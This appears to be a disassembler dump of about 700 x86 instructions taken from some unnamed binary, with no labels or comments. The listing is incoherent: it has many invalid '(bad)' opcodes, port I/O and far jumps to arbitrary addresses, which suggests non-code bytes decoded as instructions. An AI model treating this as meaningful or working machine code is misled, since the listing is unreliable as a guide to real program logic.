  41cb5d:	cmp    BYTE PTR [eax-0x1f],dh
  41cb60:	jecxz  0x41caf8
  41cb62:	mov    cl,0xb7
  41cb64:	pop    ebp
  41cb65:	adc    eax,0x3ae394dd
  41cb6a:	stos   DWORD PTR es:[edi],eax
  41cb6b:	popa   
  41cb6c:	add    esi,DWORD PTR [edx]
  41cb6e:	xchg   bh,ch
  41cb70:	pop    es
  41cb71:	mov    DWORD PTR ds:[edx+0x15],ebx
  41cb75:	mov    cl,0x89
  41cb77:	loop   0x41cb48
  41cb79:	sub    DWORD PTR [esi+eiz*2+0x70413867],edx
  41cb80:	cmp    bh,BYTE PTR [edx+eiz*8+0x6]
  41cb84:	leave  
  41cb85:	dec    ebx
  41cb86:	sub    ch,dl
  41cb88:	sub    DWORD PTR [eax-0x590fe416],esp
  41cb8e:	sahf   
  41cb8f:	out    dx,eax
  41cb90:	leave  
  41cb91:	dec    edx
  41cb92:	test   BYTE PTR [eax+0x57],bh
  41cb95:	jecxz  0x41cb8f
  41cb97:	jbe    0x41cbf5
  41cb99:	push   esp
  41cb9a:	ins    DWORD PTR es:[edi],dx
  41cb9b:	add    edi,ebx
  41cb9d:	push   ebx
  41cb9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb9f:	clc    
  41cba0:	arpl   si,cx
  41cba2:	dec    edx
  41cba3:	out    dx,eax
  41cba4:	test   BYTE PTR [esi],dh
  41cba6:	std    
  41cba7:	cmp    DWORD PTR [esi+0x1d5daaf0],0x17
  41cbae:	test   BYTE PTR [eax+0x102d898a],ch
  41cbb4:	adc    esi,esi
  41cbb6:	and    esi,DWORD PTR ds:0xfb0b2e5d
  41cbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbbd:	pop    esi
  41cbbe:	mov    eax,0xb134c81f
  41cbc3:	push   edx
  41cbc4:	or     cl,ah
  41cbc6:	adc    BYTE PTR [esi+0x22],cl
  41cbc9:	es jno 0x41cb6b
  41cbcc:	xchg   DWORD PTR [edi-0x68f37d5e],esp
  41cbd2:	arpl   ax,cx
  41cbd4:	mov    ch,0xf7
  41cbd6:	outs   dx,BYTE PTR ds:[esi]
  41cbd7:	adc    DWORD PTR [esi],0xc7d5f9a7
  41cbdd:	sub    esp,DWORD PTR [esi*4-0x5bc857b9]
  41cbe4:	or     al,0x93
  41cbe6:	push   DWORD PTR [ebp-0x700f28c3]
  41cbec:	add    edi,DWORD PTR [ebx-0x20]
  41cbef:	test   al,0xf2
  41cbf1:	jge    0x41cbb4
  41cbf3:	jmp    0xb824a1de
  41cbf8:	pop    esi
  41cbf9:	cld    
  41cbfa:	cmc    
  41cbfb:	lahf   
  41cbfc:	sar    BYTE PTR [esi-0x3],0x8c
  41cc00:	inc    esi
  41cc01:	and    esi,0xffffffd5
  41cc04:	or     al,0xb
  41cc06:	push   ebp
  41cc07:	xchg   esi,eax
  41cc08:	out    dx,eax
  41cc09:	sbb    eax,0x41c0be77
  41cc0e:	mov    edi,0x2a31c522
  41cc13:	adc    ecx,eax
  41cc15:	aas    
  41cc16:	(bad)  
  41cc17:	adc    al,0x34
  41cc19:	(bad)  
  41cc1a:	mov    al,ds:0xe2041d12
  41cc1f:	pop    ecx
  41cc20:	push   0xa
  41cc22:	cmp    DWORD PTR [ecx+0x39],0x57
  41cc26:	lods   al,BYTE PTR ds:[esi]
  41cc27:	xchg   ecx,eax
  41cc28:	inc    edx
  41cc29:	mov    ebx,DWORD PTR [ebx+0x5b]
  41cc2c:	mov    eax,0x29b61ea1
  41cc31:	rcl    BYTE PTR [ebp+0x3cd0546e],0xcf
  41cc38:	push   edi
  41cc39:	cmp    DWORD PTR [edi],ebx
  41cc3b:	mov    bl,BYTE PTR [ebx]
  41cc3d:	(bad)  
  41cc3e:	imul   esp,DWORD PTR [edi-0x39e4c5b1],0xf0ea019d
  41cc48:	mov    esp,0x1bbea214
  41cc4d:	sub    BYTE PTR [ebp-0x7b139b2],al
  41cc53:	mov    al,0x5a
  41cc55:	pop    ebp
  41cc56:	int    0xde
  41cc58:	les    ebx,FWORD PTR [ecx]
  41cc5a:	dec    ecx
  41cc5b:	imul   eax,DWORD PTR [ebp-0x165a3ed6],0x43
  41cc62:	mov    dh,0x1c
  41cc64:	push   ebp
  41cc65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc66:	loope  0x41cc69
  41cc68:	jg     0x41cbfa
  41cc6a:	xchg   edx,eax
  41cc6b:	cmp    eax,0xf7265e29
  41cc70:	xchg   esp,eax
  41cc71:	push   ss
  41cc72:	adc    eax,0x5f5d1dc3
  41cc77:	cs jge 0x41ccf2
  41cc7a:	cmp    BYTE PTR [esi+0x74],0xf9
  41cc7e:	push   es
  41cc7f:	ins    BYTE PTR es:[edi],dx
  41cc80:	inc    ebx
  41cc81:	push   edi
  41cc82:	push   es
  41cc83:	push   es
  41cc84:	adc    cl,BYTE PTR [edi]
  41cc86:	mov    esp,0x7251feae
  41cc8b:	xchg   esi,eax
  41cc8c:	sahf   
  41cc8d:	xchg   BYTE PTR [esi+0x14310ae7],dl
  41cc93:	stos   DWORD PTR es:[edi],eax
  41cc94:	inc    ebx
  41cc95:	mov    dl,0x33
  41cc97:	aaa    
  41cc98:	xchg   ecx,eax
  41cc99:	pop    es
  41cc9a:	(bad)  
  41cc9b:	xchg   edi,eax
  41cc9c:	push   esp
  41cc9d:	ss iret 
  41cc9f:	js     0x41cc6d
  41cca1:	data16 stos BYTE PTR es:[edi],al
  41cca3:	pop    esp
  41cca4:	aas    
  41cca5:	or     al,0x0
  41cca7:	add    eax,0x51b692cf
  41ccac:	mov    al,ds:0x9f260f09
  41ccb1:	jnp    0x41ccdc
  41ccb3:	in     al,0x5f
  41ccb5:	jp     0x41cc46
  41ccb7:	or     al,0xa5
  41ccb9:	imul   edx,DWORD PTR [ecx+0x28],0xffffffa0
  41ccbd:	jns    0x41cc7b
  41ccbf:	mov    eax,0x8f091db2
  41ccc5:	inc    eax
  41ccc6:	adc    eax,0xc34fe428
  41cccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cccc:	jae    0x41cc8f
  41ccce:	retf   
  41cccf:	ds std 
  41ccd1:	call   0x9853:0x9b1e3228
  41ccd8:	lods   al,BYTE PTR ds:[esi]
  41ccd9:	mov    eax,0x14f827a6
  41ccde:	jno    0x41ccfa
  41cce0:	mov    eax,fs:0x519aef50
  41cce6:	sbb    ch,BYTE PTR [ecx-0x1553c823]
  41ccec:	sub    DWORD PTR [esi],ecx
  41ccee:	pop    ebx
  41ccef:	ret    
  41ccf0:	sti    
  41ccf1:	push   ebx
  41ccf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccf3:	pop    esp
  41ccf4:	xchg   edi,eax
  41ccf5:	sbb    DWORD PTR [esp+ecx*2+0x33d2683f],ebx
  41ccfc:	mov    ss,WORD PTR [esi]
  41ccfe:	icebp  
  41ccff:	aam    0x37
  41cd01:	mov    BYTE PTR [edi+0x4c],al
  41cd04:	lock scas al,BYTE PTR es:[edi]
  41cd06:	jg     0x41cd07
  41cd08:	inc    edi
  41cd09:	repz (bad) 
  41cd0b:	pushf  
  41cd0c:	mov    edx,0x4c00d478
  41cd11:	or     edi,0xffffffaf
  41cd14:	xor    BYTE PTR [edx],cl
  41cd16:	cmp    BYTE PTR [ecx+ebx*8],ah
  41cd19:	mov    WORD PTR [ebx],es
  41cd1b:	mov    al,ds:0xed6a62d3
  41cd20:	mov    esi,0x305e3a2a
  41cd25:	aad    0xec
  41cd27:	outs   dx,BYTE PTR ds:[esi]
  41cd28:	lahf   
  41cd29:	xor    eax,ecx
  41cd2b:	enter  0x681a,0x64
  41cd2f:	es scas al,BYTE PTR es:[edi]
  41cd31:	iret   
  41cd32:	mov    WORD PTR [ebp+ecx*2-0x58],fs
  41cd36:	or     DWORD PTR [edx],ecx
  41cd38:	sbb    BYTE PTR [edi],ah
  41cd3a:	je     0x41cd44
  41cd3c:	out    0x69,al
  41cd3e:	mov    cl,0xea
  41cd40:	rol    DWORD PTR [edi],1
  41cd42:	sub    DWORD PTR [esi-0x1e],ecx
  41cd45:	jmp    0x41cd11
  41cd47:	mov    dl,0x92
  41cd49:	outs   dx,BYTE PTR ds:[esi]
  41cd4a:	inc    esi
  41cd4b:	push   0x42
  41cd4d:	retf   
  41cd4e:	cmp    DWORD PTR [ebx-0x31],ecx
  41cd51:	pop    esi
  41cd52:	scas   eax,DWORD PTR es:[edi]
  41cd53:	mov    eax,ds:0xfa46a08c
  41cd58:	mov    ecx,0x538ac054
  41cd5d:	aas    
  41cd5e:	test   BYTE PTR [eax-0x9],dh
  41cd61:	push   ebp
  41cd62:	xor    al,0x82
  41cd64:	add    al,0x41
  41cd66:	sbb    BYTE PTR ds:[ecx+0x3eeba0b1],0x18
  41cd6e:	(bad)  
  41cd6f:	jae    0x41cd5d
  41cd71:	gs sub al,0x9f
  41cd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd75:	dec    esp
  41cd76:	loope  0x41cd0c
  41cd78:	lahf   
  41cd79:	dec    ecx
  41cd7a:	je     0x41cd5b
  41cd7c:	mov    esi,0xc418744a
  41cd81:	in     al,dx
  41cd82:	pop    ebp
  41cd83:	add    cl,BYTE PTR [edi]
  41cd85:	and    dh,BYTE PTR [esi]
  41cd87:	shl    BYTE PTR [eax*8+0x4454d156],cl
  41cd8e:	loopne 0x41cd5d
  41cd90:	mov    ah,0x49
  41cd92:	push   eax
  41cd93:	sahf   
  41cd94:	add    DWORD PTR [esi],esp
  41cd96:	push   eax
  41cd97:	jge    0x41cdf0
  41cd99:	adc    eax,0xb16f44c
  41cd9e:	scas   al,BYTE PTR es:[edi]
  41cd9f:	cmp    BYTE PTR [ecx+0x7ae42782],0x2e
  41cda6:	fsub   DWORD PTR [ebp-0x3f]
  41cda9:	shl    DWORD PTR [ebx-0x3cd9f4b5],cl
  41cdaf:	(bad)  
  41cdb0:	jle    0x41cd60
  41cdb2:	jge    0x41cd92
  41cdb4:	xchg   edi,eax
  41cdb5:	push   0x7
  41cdb7:	std    
  41cdb8:	js     0x41cd8f
  41cdba:	enter  0xa382,0x36
  41cdbe:	mov    al,0x7a
  41cdc0:	mov    ebp,DWORD PTR [eax+0x74de7d7]
  41cdc6:	lods   al,BYTE PTR ds:[esi]
  41cdc7:	loope  0x41cdc5
  41cdc9:	cdq    
  41cdca:	adc    al,0xc2
  41cdcc:	or     ah,al
  41cdce:	enter  0x68f5,0x4c
  41cdd2:	inc    esi
  41cdd3:	outs   dx,BYTE PTR ds:[esi]
  41cdd4:	mov    bl,0x3d
  41cdd6:	shr    DWORD PTR [ebp+0x1acb5c7e],1
  41cddc:	pop    ecx
  41cddd:	add    ecx,DWORD PTR ds:0x6f21c36c
  41cde3:	inc    ebx
  41cde4:	sahf   
  41cde5:	push   ecx
  41cde6:	push   edi
  41cde7:	xchg   esi,eax
  41cde8:	sub    BYTE PTR [ebx-0x52],cl
  41cdeb:	fmul   QWORD PTR [eax]
  41cded:	jns    0x41cd9c
  41cdef:	dec    ebp
  41cdf0:	and    eax,0x8019a9c
  41cdf5:	pop    ds
  41cdf6:	push   edi
  41cdf7:	pushf  
  41cdf8:	arpl   WORD PTR [esi],bx
  41cdfa:	xchg   ebp,eax
  41cdfb:	mov    ebp,0xaff55245
  41ce00:	sub    esi,esi
  41ce02:	aas    
  41ce03:	mov    ah,0xed
  41ce05:	sub    BYTE PTR [eax+0x788120f4],bl
  41ce0b:	aas    
  41ce0c:	adc    edx,ebp
  41ce0e:	jbe    0x41ce24
  41ce10:	popa   
  41ce11:	cmp    ebx,DWORD PTR [edi]
  41ce13:	dec    ebx
  41ce14:	sbb    DWORD PTR [ebp+0x6421841f],0x62
  41ce1b:	jae    0x41ce6a
  41ce1d:	nop
  41ce1e:	fsubp  st(6),st
  41ce20:	or     ch,cl
  41ce22:	xor    BYTE PTR [esi],0x40
  41ce25:	pop    esi
  41ce26:	jge    0x41ce17
  41ce28:	mov    ch,0xa0
  41ce2a:	xchg   ecx,eax
  41ce2b:	push   cs
  41ce2c:	mov    eax,0x9c43506a
  41ce31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce32:	and    DWORD PTR [esp+ebx*4-0x64],eax
  41ce36:	cs loopne 0x41ceb6
  41ce39:	outs   dx,DWORD PTR ds:[esi]
  41ce3a:	fsubr  DWORD PTR [ecx+eax*4]
  41ce3d:	bound  edi,QWORD PTR [esi+0x66630f87]
  41ce43:	push   ebp
  41ce44:	into   
  41ce45:	nop
  41ce46:	sub    ebp,DWORD PTR [eax-0x4dd4026e]
  41ce4c:	pop    ss
  41ce4d:	fs fwait
  41ce4f:	inc    edx
  41ce50:	xor    DWORD PTR [edi],edx
  41ce52:	arpl   WORD PTR [esi+0x1c464bd2],sp
  41ce58:	push   esi
  41ce59:	mov    al,0xd0
  41ce5b:	sbb    ebx,ebp
  41ce5d:	pop    ecx
  41ce5e:	and    al,0x75
  41ce60:	out    dx,al
  41ce61:	call   0xcb821b33
  41ce66:	nop
  41ce67:	xchg   ebx,eax
  41ce68:	mov    esi,0xee94bfe3
  41ce6d:	add    al,0xf4
  41ce6f:	add    DWORD PTR [ecx+esi*1],ebx
  41ce72:	aam    0x67
  41ce74:	xchg   DWORD PTR [eax+eax*2],ebp
  41ce77:	push   edi
  41ce78:	sbb    al,ah
  41ce7a:	leave  
  41ce7b:	test   BYTE PTR [edi+ecx*4-0x48],bh
  41ce7f:	jmp    0x5f08fa7f
  41ce84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce85:	xchg   ebx,eax
  41ce86:	dec    ecx
  41ce87:	(bad)  
  41ce88:	shl    dh,1
  41ce8a:	mov    ecx,0x39cdaff0
  41ce8f:	mov    bh,0xaa
  41ce91:	imul   esi,esi,0x297fc95b
  41ce97:	adc    DWORD PTR ds:0xcfe79899,0xffffffa4
  41ce9e:	jne    0x41ceb8
  41cea0:	push   esi
  41cea1:	adc    edx,DWORD PTR [edx-0x21]
  41cea4:	scas   eax,DWORD PTR es:[edi]
  41cea5:	test   al,0xfc
  41cea7:	sub    BYTE PTR [edi-0x1a59b565],bl
  41cead:	xor    eax,0xf6e25ea3
  41ceb2:	pop    edx
  41ceb3:	sbb    BYTE PTR [esi-0x9af6fda],dl
  41ceb9:	mov    ecx,0x91cbad87
  41cebe:	(bad)  
  41cebf:	fmul   st,st(7)
  41cec1:	fidivr DWORD PTR [edx+0x360e617c]
  41cec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cec8:	and    eax,0xbe2dbdbc
  41cecd:	shl    DWORD PTR [edi+0x5d],1
  41ced0:	aaa    
  41ced1:	mov    eax,0xe776bbda
  41ced6:	pop    ecx
  41ced7:	sbb    ecx,DWORD PTR [edi]
  41ced9:	cmp    al,0x35
  41cedb:	nop
  41cedc:	rcr    BYTE PTR [edi-0x47d7eaf],1
  41cee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cee3:	cdq    
  41cee4:	mov    cl,0x1b
  41cee6:	adc    edi,DWORD PTR [edx-0x2cd32a3c]
  41ceec:	xchg   edi,eax
  41ceed:	mov    ecx,0xac212145
  41cef2:	mov    bl,0xac
  41cef4:	pmaxsw mm5,QWORD PTR [ecx+0x3852b98b]
  41cefb:	sub    dl,BYTE PTR [ebx+0x33]
  41cefe:	out    0xda,eax
  41cf00:	cmp    bl,ah
  41cf02:	add    DWORD PTR [esi],eax
  41cf04:	loopne 0x41ceea
  41cf06:	xor    al,0x70
  41cf08:	addr16 in eax,0xe0
  41cf0b:	popf   
  41cf0c:	das    
  41cf0d:	xchg   edx,eax
  41cf0e:	mov    cs,WORD PTR [ebx-0x5f194726]
  41cf14:	sbb    eax,0xa5239614
  41cf19:	in     al,0xe
  41cf1b:	jge    0x41cf00
  41cf1d:	hlt    
  41cf1e:	and    cl,BYTE PTR [edx-0x7e0e7ab1]
  41cf24:	cwde   
  41cf25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf26:	shr    ah,0xff
  41cf29:	inc    edx
  41cf2a:	jg     0x41ceee
  41cf2c:	cmp    DWORD PTR [ebx+0xa],ebp
  41cf2f:	push   esp
  41cf30:	push   edx
  41cf31:	dec    ecx
  41cf32:	cli    
  41cf33:	xor    edi,DWORD PTR [ecx+0x4a]
  41cf36:	(bad)  
  41cf37:	std    
  41cf38:	sbb    dl,dl
  41cf3a:	inc    ebx
  41cf3b:	sbb    al,0x85
  41cf3d:	inc    esi
  41cf3e:	dec    ecx
  41cf3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf40:	je     0x41cf1b
  41cf42:	and    eax,0xdccc0a62
  41cf47:	fisubr WORD PTR [ecx]
  41cf49:	les    esp,FWORD PTR [ebx-0x3e90fe9b]
  41cf4f:	xor    al,BYTE PTR [edx+0x56415d76]
  41cf55:	xor    ebp,DWORD PTR [eax+0xd6d9f17]
  41cf5b:	scas   al,BYTE PTR es:[edi]
  41cf5c:	jne    0x41cfb9
  41cf5e:	nop
  41cf5f:	mov    ebp,0xd6880c27
  41cf64:	fdiv   st,st(1)
  41cf66:	adc    BYTE PTR [ecx-0x27],0x18
  41cf6a:	xor    edx,DWORD PTR [eax]
  41cf6c:	xchg   ebp,eax
  41cf6d:	repnz icebp 
  41cf6f:	xor    DWORD PTR [edx],ebp
  41cf71:	jbe    0x41cf50
  41cf73:	cmp    eax,0x5b183fe0
  41cf78:	pop    edx
  41cf79:	data16 sub dh,ah
  41cf7c:	jp     0x41cf41
  41cf7e:	jo     0x41cf94
  41cf80:	in     eax,dx
  41cf81:	jae    0x41cf03
  41cf83:	loop   0x41cf80
  41cf85:	fdiv   DWORD PTR [edx+edi*8-0x5d]
  41cf89:	out    dx,eax
  41cf8a:	dec    eax
  41cf8b:	out    0x4a,eax
  41cf8d:	cmp    ebp,DWORD PTR [esi+ebx*2+0x7235ca07]
  41cf94:	inc    esi
  41cf95:	add    al,0x1f
  41cf97:	xchg   esi,eax
  41cf98:	aad    0xe4
  41cf9a:	in     al,dx
  41cf9b:	pop    ecx
  41cf9c:	or     dh,BYTE PTR [ebx]
  41cf9e:	mov    ch,0x47
  41cfa0:	shr    ebp,cl
  41cfa2:	in     eax,0x1d
  41cfa4:	xchg   ebx,eax
  41cfa5:	stos   DWORD PTR es:[edi],eax
  41cfa6:	inc    esp
  41cfa7:	loope  0x41cfd1
  41cfa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfaa:	loope  0x41d017
  41cfac:	(bad)  
  41cfad:	dec    esi
  41cfae:	(bad)  
  41cfaf:	out    0x2f,eax
  41cfb1:	pop    ss
  41cfb2:	adc    DWORD PTR [edx-0x7d70f14f],edi
  41cfb8:	mov    dh,ch
  41cfba:	addr16 push edx
  41cfbc:	xchg   esi,eax
  41cfbd:	shl    BYTE PTR [ecx],cl
  41cfbf:	lods   eax,DWORD PTR ds:[esi]
  41cfc0:	stc    
  41cfc1:	call   0x7322c570
  41cfc6:	mov    edx,0x2ab93165
  41cfcb:	ret    
  41cfcc:	dec    esp
  41cfcd:	or     ebx,0xffffffd0
  41cfd0:	ja     0x41cfd3
  41cfd2:	jno    0x41cfd1
  41cfd4:	pop    edi
  41cfd5:	and    edx,DWORD PTR [ebx+0x3d]
  41cfd8:	pop    ebp
  41cfd9:	dec    ebp
  41cfda:	ins    BYTE PTR es:[edi],dx
  41cfdb:	sahf   
  41cfdc:	inc    esp
  41cfdd:	xchg   BYTE PTR [esi-0x5fbdc9fe],dh
  41cfe3:	(bad)  
  41cfe4:	mov    ds:0xcc6b6e2c,al
  41cfe9:	test   al,0x3d
  41cfeb:	push   ss
  41cfec:	js     0x41d00b
  41cfee:	cld    
  41cfef:	je     0x41d06e
  41cff1:	out    dx,al
  41cff2:	sbb    eax,0x94870759
  41cff7:	fmul   DWORD PTR [ebx]
  41cff9:	add    BYTE PTR [esi+0x51c5009f],al
  41cfff:	jmp    0xd51f:0x4a05138
  41d006:	je     0x41d067
  41d008:	or     al,0xf0
  41d00a:	test   BYTE PTR [ecx+0x6b],al
  41d00d:	jecxz  0x41cfea
  41d00f:	(bad)  
  41d010:	and    al,0x48
  41d012:	mov    ecx,0xee370de4
  41d017:	jno    0x41cfe2
  41d019:	mov    ebp,0x16a1c068
  41d01e:	jecxz  0x41d09c
  41d020:	mov    edi,0x4f5873e2
  41d025:	inc    esi
  41d026:	lods   eax,DWORD PTR ds:[esi]
  41d027:	cmp    ebp,DWORD PTR [ebp+0xdca5b7e]
  41d02d:	mov    ds:0x6797761e,al
  41d032:	test   BYTE PTR [eax+esi*2],bh
  41d035:	les    eax,FWORD PTR [eax]
  41d037:	out    dx,eax
  41d038:	out    0x72,al
  41d03a:	shr    BYTE PTR [esi],1
  41d03c:	scas   al,BYTE PTR es:[edi]
  41d03d:	retf   0xd94c
  41d040:	stos   DWORD PTR es:[edi],eax
  41d041:	loope  0x41d0a5
  41d043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d044:	out    dx,al
  41d045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d046:	lods   al,BYTE PTR ds:[esi]
  41d047:	retf   
  41d048:	repnz loopne 0x41d0c7
  41d04b:	adc    al,0xcf
  41d04d:	clc    
  41d04e:	mov    ecx,0xae688ea1
  41d053:	rcl    DWORD PTR [edi-0x22],0x3c
  41d057:	mov    ah,0x1d
  41d059:	add    BYTE PTR [esi],0x85
  41d05c:	fmulp  st(7),st
  41d05e:	outs   dx,DWORD PTR ds:[esi]
  41d05f:	fwait
  41d060:	mov    dl,0xf4
  41d062:	sbb    eax,0x7998dbe3
  41d067:	dec    esi
  41d068:	or     eax,0xf5909e94
  41d06d:	call   0x7e7d72fd
  41d072:	adc    DWORD PTR [edx-0x6b90ac23],esi
  41d078:	jmp    0x41d0e6
  41d07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d07b:	(bad)  [eax]
  41d07d:	sub    dl,dh
  41d07f:	stos   BYTE PTR es:[edi],al
  41d080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d081:	(bad)  
  41d082:	cmc    
  41d083:	cli    
  41d084:	jo     0x41d0ec
  41d086:	jmp    0x83ad:0x48bf7ed6
  41d08d:	iret   
  41d08e:	and    eax,0xa1d2a301
  41d093:	push   esp
  41d094:	jo     0x41d0e5
  41d096:	cld    
  41d097:	fwait
  41d098:	or     ah,dl
  41d09a:	and    al,0x7
  41d09c:	inc    esi
  41d09d:	xchg   ecx,eax
  41d09e:	fisubr WORD PTR [ecx-0x5d76a908]
  41d0a4:	cmp    DWORD PTR [ebx+0x146d34f9],0xdb1cf56a
  41d0ae:	and    al,BYTE PTR [ecx+edi*4]
  41d0b1:	es add al,ch
  41d0b4:	jge    0x41d0a0
  41d0b6:	add    cl,BYTE PTR [esi]
  41d0b8:	in     al,0xf9
  41d0ba:	iret   
  41d0bb:	in     eax,dx
  41d0bc:	or     esi,DWORD PTR [ebx-0x80]
  41d0bf:	mov    dh,0x1a
  41d0c1:	add    BYTE PTR ds:0xbc2efcb3,ch
  41d0c7:	pop    edx
  41d0c8:	sub    cl,0x17
  41d0cb:	pop    esi
  41d0cc:	rcr    ah,cl
  41d0ce:	push   edx
  41d0cf:	pop    ebx
  41d0d0:	push   esi
  41d0d1:	in     eax,dx
  41d0d2:	(bad)  
  41d0d3:	xor    edx,esp
  41d0d5:	adc    edi,DWORD PTR [eax]
  41d0d7:	dec    esp
  41d0d8:	loope  0x41d070
  41d0da:	js     0x41d0df
  41d0dc:	clc    
  41d0dd:	cmp    eax,0xe3f999a9
  41d0e2:	cmp    eax,0x272d0cf8
  41d0e7:	lahf   
  41d0e8:	popf   
  41d0e9:	jg     0x41d155
  41d0eb:	fidiv  WORD PTR [ebp+0x2a]
  41d0ee:	ror    DWORD PTR [edx],cl
  41d0f0:	dec    ebx
  41d0f1:	sbb    al,0xf6
  41d0f3:	and    BYTE PTR [esi+0x1d],bl
  41d0f6:	(bad)  
  41d0f7:	xlat   BYTE PTR ds:[ebx]
  41d0f8:	dec    ebx
  41d0f9:	push   edx
  41d0fa:	test   al,0x3f
  41d0fc:	cmp    BYTE PTR [edx-0x5493a223],dl
  41d102:	mov    al,ds:0xa96c5d9f
  41d107:	fistp  WORD PTR [edi-0x44]
  41d10a:	xchg   edx,eax
  41d10b:	mov    ?,WORD PTR [ebx]
  41d10d:	xor    BYTE PTR [edx-0x42f418ac],bh
  41d113:	add    BYTE PTR [edx+0x39],dh
  41d116:	dec    esp
  41d117:	jle    0x41d133
  41d119:	(bad)  
  41d11a:	loop   0x41d09e
  41d11c:	loop   0x41d10d
  41d11e:	dec    edi
  41d11f:	repz enter 0x822a,0x11
  41d124:	add    BYTE PTR [edx+edx*8+0x75],dl
  41d128:	xchg   ebp,eax
  41d129:	stc    
  41d12a:	sbb    eax,0xd2a32e23
  41d12f:	pop    es
  41d130:	push   eax
  41d131:	dec    edi
  41d132:	ret    0xa814
  41d135:	ret    
  41d136:	cmp    DWORD PTR [edx-0x3f],ecx
  41d139:	cmp    edx,DWORD PTR [ebx-0x1c]
  41d13c:	jmp    FWORD PTR [eax]
  41d13e:	or     al,0x9c
  41d140:	(bad)  
  41d141:	mov    eax,0x4d23a5e0
  41d146:	popf   
  41d147:	push   ecx
  41d148:	xor    BYTE PTR [esi-0x4],0xcb
  41d14c:	clc    
  41d14d:	xor    bl,BYTE PTR [esi]
  41d14f:	sahf   
  41d150:	ret    
  41d151:	xchg   ecx,eax
  41d152:	outs   dx,DWORD PTR ds:[esi]
  41d153:	mov    ah,0xf5
  41d155:	adc    edi,ebx
  41d157:	jp     0x41d1d4
  41d159:	ficom  WORD PTR [eax-0x2c]
  41d15c:	push   ss
  41d15d:	push   ebx
  41d15e:	add    BYTE PTR [ebp-0x60],0xed
  41d162:	sub    eax,0x57b7b579
  41d167:	cmp    eax,DWORD PTR [eax+0x2f]
  41d16a:	sub    BYTE PTR [esi-0x20],bh
  41d16d:	loope  0x41d18e
  41d16f:	xchg   BYTE PTR [eax-0x60549619],bl
  41d175:	jp     0x41d1b1
  41d177:	test   eax,0xa7f7e903
  41d17c:	dec    ebp
  41d17d:	dec    ecx
  41d17e:	aam    0xf4
  41d180:	int3   
  41d181:	outs   dx,BYTE PTR ds:[esi]
  41d182:	mov    bl,0xd9
  41d184:	jecxz  0x41d1aa
  41d186:	jbe    0x41d124
  41d188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d189:	mov    eax,ds:0xb5a59915
  41d18e:	jge    0x41d1c8
  41d190:	out    0xb2,al
  41d192:	popa   
  41d193:	les    ebp,FWORD PTR ds:0x8c5da6b2
  41d199:	add    eax,0x9eb550f0
  41d19e:	jne    0x41d162
  41d1a0:	sbb    BYTE PTR [ecx-0x7dbe3306],al
  41d1a6:	shl    BYTE PTR [ebp-0x5],1
  41d1a9:	or     ah,0xab
  41d1ac:	sti    
  41d1ad:	dec    edx
  41d1ae:	jnp    0x41d188
  41d1b0:	(bad)  
  41d1b1:	out    0xd5,al
  41d1b3:	jo     0x41d1e6
  41d1b5:	aas    
  41d1b6:	imul   BYTE PTR [esp+ecx*1]
  41d1b9:	jmp    0x41d1b0
  41d1bb:	out    dx,al
  41d1bc:	(bad)  
  41d1bd:	mov    dl,0x3e
  41d1bf:	int3   
  41d1c0:	jnp    0x41d1a2
  41d1c2:	fisttp WORD PTR [eax+0x69b88f63]
  41d1c8:	xor    al,0x86
  41d1ca:	jl     0x41d1ab
  41d1cc:	fcomi  st,st(1)
  41d1ce:	mov    ds:0x38a432ea,al
  41d1d3:	pop    eax
  41d1d4:	mov    esp,0xa42f025
  41d1d9:	or     al,0x90
  41d1db:	lods   al,BYTE PTR ds:[esi]
  41d1dc:	arpl   WORD PTR [ebp-0x42],ax
  41d1df:	cs int3 
  41d1e1:	pop    ds
  41d1e2:	xor    edx,ebp
  41d1e4:	jl     0x41d1df
  41d1e6:	jge    0x41d24a
  41d1e8:	mov    esp,0x785ac84d
  41d1ed:	cli    
  41d1ee:	icebp  
  41d1ef:	es jae 0x41d1bd
  41d1f2:	mov    ecx,0xc804949
  41d1f7:	hlt    
  41d1f8:	loope  0x41d191
  41d1fa:	shl    DWORD PTR [ecx-0x66],1
  41d1fd:	pop    esi
  41d1fe:	adc    bh,ch
  41d200:	pushf  
  41d201:	data16 sub cl,BYTE PTR [esi]
  41d204:	jae    0x41d239
  41d206:	jg     0x41d189
  41d208:	stc    
  41d209:	lock cmp ecx,ecx
  41d20c:	ins    BYTE PTR es:[edi],dx
  41d20d:	pop    edx
  41d20e:	jo     0x41d1c7
  41d210:	cmp    DWORD PTR [edi],0x1f34bb9c
  41d216:	ins    BYTE PTR es:[edi],dx
  41d217:	mul    BYTE PTR [eax+0x24f1b224]
  41d21d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d21e:	call   0xc9b:0xe6acb55
  41d225:	dec    edi
  41d226:	(bad)  
  41d227:	mov    edi,0xb1c323a4
  41d22c:	(bad)  
  41d22d:	out    0x1c,eax
  41d22f:	pop    ecx
  41d230:	rol    BYTE PTR [eax],0x40
  41d233:	push   esi
  41d234:	retf   
  41d235:	dec    BYTE PTR [ebx+0x5be9068e]
  41d23b:	and    ebx,DWORD PTR [esi+ecx*1]
  41d23e:	(bad)  
  41d23f:	pop    eax
  41d240:	aas    
  41d241:	ins    DWORD PTR es:[edi],dx
  41d242:	dec    DWORD PTR [ecx+0x69]
  41d245:	(bad)
  41d248:	stos   BYTE PTR es:[edi],al
  41d249:	ins    BYTE PTR es:[edi],dx
